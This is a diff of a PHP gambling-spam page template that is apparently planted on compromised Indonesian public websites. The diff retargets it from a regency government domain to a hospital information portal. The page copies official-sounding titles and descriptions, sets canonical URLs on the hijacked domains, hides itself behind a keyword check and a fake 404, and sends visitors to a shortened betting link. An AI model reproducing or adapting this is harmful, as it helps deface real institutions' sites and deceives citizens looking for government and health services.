@@ -1,7 +1,7 @@
 <?php
 function feedback404()
 {
-  echo file_get_contents("https://main.tss.tabalongkab.go.id/");
+  echo file_get_contents("https://feb.unisba.ac.id/");
 
 }
 
@@ -32,15 +32,15 @@ foreach ($keywords as $keyword) {
 if (!$found) {
     show404();
 }
-$amphtml = "https://tamuramah.store/id/$dashbrand";
-$canonical = "https://main.tss.tabalongkab.go.id/$dashbrand";
+$amphtml = "https://tamuramah.com/id/$dashbrand";
+$canonical = "https://upt.ppidrsudlabuangbaji.com/upt/$dashbrand";
 $cta = "https://t.ly/betserulink";
-$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1731680826/OIG3.s3U2dmTVFFp4C.9sv2Ea_le30ix.jpg";
+$gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1731680826/OIG3.RMHqE08xz2doWlldPmyx_w2kfth.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand Perbup SPBE Kabupaten Tabalong";
-$desc = "$namabrand lembaga pemerintah dari Kabupaten Tabalong memiliki sistem perhubungan layanan yang digunakan untuk pelayanan publik agar masyarakat lebih mudah dijangkau serta lebih cepat dan efesien untuk mendapatkan fasilitas dari pusat secara langsung.";
-$konten = "$namabrand lembaga pemerintah dari Kabupaten Tabalong memiliki sistem perhubungan layanan yang digunakan untuk pelayanan publik agar masyarakat lebih mudah dijangkau serta lebih cepat dan efesien untuk mendapatkan fasilitas dari pusat secara langsung.";
+$judul = "$namabrand Login PPID RSUD Labuang Baji";
+$desc = "$namabrand memberikan tempat atau layanan publik mengenai kesehatan untuk masyarakat di Labuan Baji dengan ada nya RSUD bisa mendapatkan akses kesehatan yang baik dan bisa dilakukan secara online melalui website resminya tanpa dipungut biaya.";
+$konten = "$namabrand memberikan tempat atau layanan publik mengenai kesehatan untuk masyarakat di Labuan Baji dengan ada nya RSUD bisa mendapatkan akses kesehatan yang baik dan bisa dilakukan secara online melalui website resminya tanpa dipungut biaya.";
 ?>
 
 <!DOCTYPE HTML>
